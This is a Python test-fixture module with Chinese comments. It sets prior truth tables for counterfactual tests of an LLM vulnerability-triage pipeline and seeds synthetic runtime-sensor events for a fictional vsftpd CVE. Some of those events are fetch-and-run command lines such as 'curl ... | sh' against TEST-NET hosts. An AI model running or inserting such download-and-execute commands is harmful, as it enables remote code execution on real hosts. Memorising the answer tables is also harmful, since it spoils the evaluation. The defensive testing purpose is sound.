"""Stage 9B M4.2 收尾（Closure）：修正版反事实案例集与先验真值表。

本文件是收尾轮全部新实验的**先验设计**：真值表在本文件入库时固定，
先于任何真实 LLM 运行（git 时序可核验，与 Y_TRUTH 同一纪律）。
原始 E/X/Y 真值零改动（stage9b_quality_cases.py / TRUTH / UNIFIED_TRUTH 不动）。

包含两部分：

一、Y6 反事实修正（任务书第三部分）
  原设计（M4.2 主报告 §6.2）只去除 Y6 的 KEV（Y6_COUNTERFACTUAL_*，保留于
  stage9b_quality_cases.py 作历史记录、标注 superseded）。该设计有缺陷：
  当前确定性放大因子规则为 KEV ∨（受影响组件公网监听 ∧ CVSS≥9.0），
  Y6 的 caddy 公网监听（0.0.0.0:443）× CVSS 9.8 在去除 KEV 后仍构成放大因子，
  「去除 KEV → immediate 必须消失」的预期不成立。
  修正设计 = 完整 2×2 条件组合（KEV 有/无 × 受影响组件公网高危条件 有/无），
  每格先固定确定性预期（放大因子存在性 + 处置允许集），再做真实 LLM 验证。
  语义区分（任务书原话）：「存在紧迫性放大因子」≠「必然执行 immediate_fix」——
  放大因子是 immediate_fix + static_evidence_only 的**必要**确定性依据，
  是否最终选择 immediate 仍由模型综合漏洞适用性、暴露条件与其他可信事实裁量。

二、Runtime Agent 正向贡献实验（任务书第四部分）
  同构反事实：四条件 RT-A/B/C/D 共用**相同设备身份、相同 CVE、相同静态版本
  与厂商事实**，仅运行时证据层不同：
    RT-A  真实且新鲜的直接相关运行时证据（匹配 CVE 描述的利用模式，T-5min）；
    RT-B  新鲜但与该 CVE 无关的可疑运行时证据（无关下载器链，T-5min）；
    RT-C  已过期的直接相关证据（T-45d，传感器心跳同步过期）；
    RT-D  完全缺少运行时监控能力（无传感器、无事件）。
  每条件运行完整管线 + 隐藏 runtime_analyst 消融（ablation_mask）对照，
  度量 Agent 3 对 runtime_dimension / 证据置信度 / 处置建议的实际语义贡献，
  并与确定性程序（预取事实层）已能完成的判断区分。

安全规范：全部合成 CVE（CVE-2026-81021 独占）、TEST-NET/RFC5737 地址、
无任何真实凭据；每案例独占包名（vsftpd 不出现在任何其他 Fixture）。
"""
from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone

# ═══════════════════════════════════════════════════════════════════════════
# 一、Y6 反事实 2×2（CVE-2026-81015，Y6 Fixture 参数化；真值先验固定）
# ═══════════════════════════════════════════════════════════════════════════

Y6_CELL_ORDER = ["kev1_pub1", "kev0_pub1", "kev1_pub0", "kev0_pub0"]

# (kev, public) → 格标签；kev1_pub1 即 Y6 原样（对照锚点）
Y6_CELLS: dict[str, dict] = {
    "kev1_pub1": {"kev": True, "public": True},
    "kev0_pub1": {"kev": False, "public": True},
    "kev1_pub0": {"kev": True, "public": False},
    "kev0_pub0": {"kev": False, "public": False},
}

# 确定性预期（程序事实，可离线锁定）：每格放大因子存在性
Y6_EXPECTED_AMPLIFIER = {
    "kev1_pub1": {"kev": True, "critical_public_component": True, "any_present": True},
    "kev0_pub1": {"kev": False, "critical_public_component": True, "any_present": True},
    "kev1_pub0": {"kev": True, "critical_public_component": False, "any_present": True},
    "kev0_pub0": {"kev": False, "critical_public_component": False, "any_present": False},
}

# 先验真值表（运行前固定；允许集语义）。
# 放大因子在场的三格：immediate_fix 合法（不必然）——与 Y6 主真值同口径；
# 无放大因子格：immediate_fix 明确禁止（确定性门禁 static_urgency_without_amplifier
# 应当拦下；模型在反馈重试后仍坚持即触发 fail-closed 转人工）。
Y6_CF2_TRUTH: dict[str, dict] = {
    "kev1_pub1": {
        "label": "CF2-Y6 (KEV+, 公网Critical+) 放大因子双通道在场——Y6 原样锚点",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "upgrade_minor", "upgrade_major"},
        "actions": {"immediate_fix", "scheduled_fix"},
        "needs_human": True,
        "expected_amplifier": Y6_EXPECTED_AMPLIFIER["kev1_pub1"],
        "acceptance": "放大因子在场（KEV 与公网×9.8 双通道）；immediate 合法非必然",
    },
    "kev0_pub1": {
        "label": "CF2-Y6 (KEV−, 公网Critical+) 去除KEV但公网×9.8 仍在——放大因子仍成立（原单因素设计的关键反例）",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "upgrade_minor", "upgrade_major"},
        "actions": {"immediate_fix", "scheduled_fix"},
        "needs_human": True,
        "expected_amplifier": Y6_EXPECTED_AMPLIFIER["kev0_pub1"],
        "acceptance": "放大因子经公网×CVSS9.8 通道仍成立：不得因去除 KEV 断言 immediate 非法；"
                      "原「去 KEV 必降 scheduled」预期被本格证伪",
    },
    "kev1_pub0": {
        "label": "CF2-Y6 (KEV+, 公网Critical−) 保留KEV、组件转仅本地——放大因子经KEV通道成立",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "upgrade_minor", "upgrade_major"},
        "actions": {"immediate_fix", "scheduled_fix"},
        "needs_human": True,
        "expected_amplifier": Y6_EXPECTED_AMPLIFIER["kev1_pub0"],
        "acceptance": "KEV 单通道足以构成放大因子；immediate 合法非必然",
    },
    "kev0_pub0": {
        "label": "CF2-Y6 (KEV−, 公网Critical−) 双通道皆去除——无放大因子，immediate 禁止",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "upgrade_minor", "downgrade_minor"},
        "actions": {"scheduled_fix", "monitor", "collect_more_evidence", "mitigate"},
        "needs_human": True,   # Critical 核心资产仍触发审计门禁人工（shadow 口径）
        "expected_amplifier": Y6_EXPECTED_AMPLIFIER["kev0_pub0"],
        "acceptance": "无放大因子 → static_evidence_only 不得支撑 immediate_fix"
                      "（紧迫度上限 scheduled_fix）；这是与在场三格的正-反对照",
    },
}


def apply_y6_cell(db, cell: str) -> None:
    """把 Y 案例 Fixture 中的 Y6 调整为指定 2×2 格（其余案例不动）。

    须在 extend_fixture_for_y_cases(db, y6_kev=cell['kev']) 之后调用：
    仅改 caddy 服务的暴露形态（public=False → 仅回环监听），不触碰
    版本/厂商公告/CVSS 等静态适用性事实（四格完全一致）。
    """
    from app import models

    params = Y6_CELLS[cell]
    caddy_service = (db.query(models.AssetService)
                     .join(models.LinuxAsset, models.AssetService.asset_id == models.LinuxAsset.id)
                     .filter(models.LinuxAsset.hostname == "edge-15",
                             models.AssetService.service_name == "caddy")
                     .one())
    if params["public"]:
        caddy_service.listen_address = "0.0.0.0"
        caddy_service.is_public_exposed = True
    else:
        caddy_service.listen_address = "127.0.0.1"
        caddy_service.is_public_exposed = False
    db.commit()


# ═══════════════════════════════════════════════════════════════════════════
# 二、Runtime Agent 正向贡献实验（CVE-2026-81021 + vsftpd 独占；真值先验固定）
# ═══════════════════════════════════════════════════════════════════════════

RT_CVE = "CVE-2026-81021"
RT_HOSTNAME = "edge-rt"
RT_CONDITION_ORDER = ["RT-A", "RT-B", "RT-C", "RT-D"]

# 证据时间偏移设计（先验固定；运行时按 UTC now 计算，写入产物可追溯）
RT_FRESH_OFFSET = timedelta(minutes=5)      # RT-A / RT-B：T-5min（freshness=last_hour）
RT_STALE_OFFSET = timedelta(days=45)        # RT-C：T-45d（freshness=stale）

# 先验真值表（四条件静态事实完全一致，仅运行时层不同；允许集语义）
RT_TRUTH: dict[str, dict] = {
    "RT-A": {
        "label": "RT-A 新鲜且直接相关的利用模式证据（vsftpd 拉起 shell 子进程，T-5min）",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "upgrade_minor", "upgrade_major"},
        "actions": {"immediate_fix", "scheduled_fix"},
        "needs_human": None,
        "expected_runtime_relation": "cve_related",   # 逐条证据 relation 应达 cve 级
        "expected_freshness": "fresh",
        "acceptance": "新鲜直接相关证据可作为紧迫度依据（immediate 合法非必然）；"
                      "runtime_dimension 须引用该证据、relation 不得低于组件存在级",
    },
    "RT-B": {
        "label": "RT-B 新鲜但与该 CVE 无关的可疑证据（sshd 会话下载器链 + vsftpd 常规活动）",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "downgrade_minor"},
        "actions": {"scheduled_fix", "monitor", "collect_more_evidence"},
        "needs_human": None,
        "expected_runtime_relation": "suspicious_unlinked",
        "expected_freshness": "fresh",
        "acceptance": "无关可疑事件不得作为本 CVE 的利用/紧迫依据（不得 immediate_fix、"
                      "不得 upgrade 方向）；exploitation_relation 应为 suspicious_unlinked",
    },
    "RT-C": {
        "label": "RT-C 已过期的直接相关证据（T-45d，传感器心跳同步过期）",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "downgrade_minor", "upgrade_minor"},
        "actions": {"scheduled_fix", "monitor", "collect_more_evidence", "mitigate"},
        "needs_human": None,
        "expected_runtime_relation": "cve_related",   # 相关但过期
        "expected_freshness": "stale",
        "acceptance": "过期证据不得作为当前活跃利用的依据（不得 immediate_fix）；"
                      "运行时证据有效性须如实降级（stale），且不得连带否定静态适用性",
    },
    "RT-D": {
        "label": "RT-D 完全缺少运行时监控能力（无传感器、无事件）",
        "impact": {"confirmed_affected", "potentially_affected"},
        "directions": {"maintain", "downgrade_minor"},
        "actions": {"scheduled_fix", "monitor", "collect_more_evidence"},
        "needs_human": None,
        "expected_runtime_relation": "monitoring_missing",
        "expected_freshness": None,
        "acceptance": "监控缺失不得解释为漏洞不存在或利用不存在（impact 仍受影响）；"
                      "runtime_dimension 须如实标注 monitoring_missing/unavailable",
    },
}


def build_rt_condition_fixture(db, condition: str) -> None:
    """在 E/X 基础 Fixture 之上构建 RT 条件库（每条件独立数据库）。

    四条件的设备身份/CVE/静态版本与厂商事实**逐字段一致**，仅
    RuntimeSensor/RuntimeEvent 层按条件不同（同构反事实的干预点）。
    """
    from app import models
    from app.services.vulnerability_intelligence.service import upsert_source_record
    from app.services.security_evidence import persist_evidence
    from app.services.matching_engine import run_matching
    from app.services.risk_engine import calculate_risk

    if condition not in RT_TRUTH:
        raise ValueError(f"未知 RT 条件: {condition}")

    now = datetime.now(timezone.utc)

    asset = models.LinuxAsset(hostname=RT_HOSTNAME, ip_address="192.0.2.50",
                              distribution="ubuntu", os_version="22.04",
                              os_name="Ubuntu", device_type="server",
                              exposure_level="internal", business_level="normal",
                              inventory_complete=True)
    db.add(asset)
    db.flush()
    db.add(models.AssetPackage(asset_id=asset.id, package_name="vsftpd",
                               package_version="3.0.3-2", package_manager="apt"))
    db.add(models.AssetService(asset_id=asset.id, service_name="ssh", port=22,
                               protocol="tcp", listen_address="192.0.2.50",
                               is_public_exposed=False, process_name="sshd"))
    db.add(models.VulnerabilityInfo(
        cve_id=f"{RT_CVE}:jammy", title="vsftpd SITE command injection (fixture)",
        description="Fixture synthetic advisory: unauthenticated command injection via "
                    "crafted filenames in SITE commands. Exploitation manifests as the "
                    "vsftpd service process spawning a shell child that fetches remote "
                    "payloads.",
        cvss_score=8.5, cvss_severity="High", affected_package="vsftpd",
        fixed_version="3.0.3-5", source="fixture", published_date="2026-09-25",
        last_modified_date="2026-10-05"))
    db.add(models.ThreatIntelSource(cve_id=f"{RT_CVE}:jammy", is_kev=False,
                                    epss_score=0.3, epss_percentile=0.7,
                                    exploit_status="none"))
    db.flush()
    upsert_source_record(db, RT_CVE, "canonical",
                         {"records": [{"release": "jammy", "package": "vsftpd",
                                       "status": "affected", "fixed_version": "3.0.3-5",
                                       "priority": "high"}]},
                         source_updated_at="2026-10-05T00:00:00Z")
    upsert_source_record(db, RT_CVE, "nvd",
                         {"cvss": {"score": 8.5, "severity": "High",
                                   "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L"},
                          "description": "Unauthenticated command injection via crafted "
                                         "SITE filenames (fixture).",
                          "cwe": ["CWE-78"], "cpe_status": "affected"},
                         source_updated_at="2026-10-05T00:00:00Z")
    upsert_source_record(db, RT_CVE, "epss", {"score": 0.3, "percentile": 0.7},
                         source_updated_at="2026-10-06T00:00:00Z")

    events: list[dict] = []

    def ev(*, process, parent, cmdline, sev="info", score=0, rule="", ts,
           event_type="process_execution", category="process_execution",
           dest="", port=0, pid=0, ppid=0):
        # timestamp 与 ts 同值双键：persist_evidence 取 event["timestamp"] 写入
        # 证据层（data_quality 的 freshness 依此计算），RuntimeEvent 用 ts——
        # 缺 timestamp 会导致证据层时间戳为空（脚手架竞态之外的第二处缺陷，
        # 由 RT-A 首跑暴露，见收尾报告 §RT）。
        return {"hostname": RT_HOSTNAME, "asset_id": asset.id, "source": "falco",
                "event_type": event_type, "category": category, "severity": sev,
                "severity_score": score, "rule": rule, "process_name": process,
                "parent_process": parent, "commandline": cmdline, "file_path": "",
                "destination": dest, "port": port, "ts": ts, "timestamp": ts,
                "pid": pid, "ppid": ppid,
                "sensor_id": f"sensor-{RT_HOSTNAME}"}

    if condition in ("RT-A", "RT-C"):
        offset = RT_FRESH_OFFSET if condition == "RT-A" else RT_STALE_OFFSET
        ts = (now - offset).isoformat()
        # 直接相关：漏洞描述的利用模式——vsftpd 服务进程拉起 shell 拉取远端载荷
        events.extend([
            ev(process="sh", parent="vsftpd",
               cmdline="sh -c id > /tmp/.rtprobe", sev="warning", score=72,
               rule="service_shell_spawn", ts=ts, pid=5100, ppid=5099),
            ev(process="curl", parent="sh",
               cmdline="curl -s http://198.51.100.90/rt.sh | sh",
               dest="198.51.100.90:80", port=80, sev="warning", score=65,
               rule="downloader_execution", ts=ts, pid=5101, ppid=5100,
               event_type="network_activity", category="network_activity"),
        ])
    elif condition == "RT-B":
        ts = (now - RT_FRESH_OFFSET).isoformat()
        # vsftpd 常规服务活动（组件存在/服务活跃——非利用证据）+ 无关可疑链
        events.extend([
            ev(process="vsftpd", parent="systemd",
               cmdline="/usr/sbin/vsftpd /etc/vsftpd.conf", ts=ts, pid=5200, ppid=1),
            ev(process="bash", parent="sshd",
               cmdline="bash -c curl -s http://198.51.100.91/b.sh | sh",
               sev="warning", score=63, rule="service_shell_spawn", ts=ts,
               pid=5201, ppid=5100),
            ev(process="curl", parent="bash",
               cmdline="curl -s http://198.51.100.91/b.sh",
               dest="198.51.100.91:80", port=80, sev="warning", score=57,
               rule="downloader_execution", ts=ts, pid=5202, ppid=5201,
               event_type="network_activity", category="network_activity"),
        ])
    # RT-D：无事件、无传感器

    for item in events:
        db.add(models.RuntimeEvent(
            asset_id=asset.id, hostname=item["hostname"], source=item["source"],
            event_type=item["event_type"], category=item["category"],
            severity=item["severity"], severity_score=item["severity_score"],
            rule=item["rule"], process_name=item["process_name"],
            parent_process=item["parent_process"], commandline=item["commandline"],
            file_path=item.get("file_path", ""), destination=item.get("destination", ""),
            port=item.get("port", 0), risk_signal=item["rule"],
            raw_json=json.dumps({"fixture": True}), occurred_at=item["ts"],
            process_id=item["pid"], parent_process_id=item["ppid"],
            process_exec_id=f"exec-{RT_HOSTNAME}-{item['pid']}",
            parent_exec_id=f"exec-{RT_HOSTNAME}-{item['ppid']}" if item["ppid"] else "",
            sensor_id=item["sensor_id"],
            event_fingerprint=f"fp-rt-{condition}-{item['pid']}"))

    if condition != "RT-D":
        heartbeat = now if condition != "RT-C" else (now - RT_STALE_OFFSET)
        db.add(models.RuntimeSensor(
            asset_id=asset.id, sensor_id=f"sensor-{RT_HOSTNAME}", source="falco",
            status="running", last_heartbeat_at=heartbeat, dropped_events=0,
            capabilities_json=json.dumps({"metrics": "dropped_events"}),
            detail="fixture-rt"))

    db.flush()
    persist_evidence(db, events)
    run_matching(db)
    calculate_risk(db)
    db.commit()
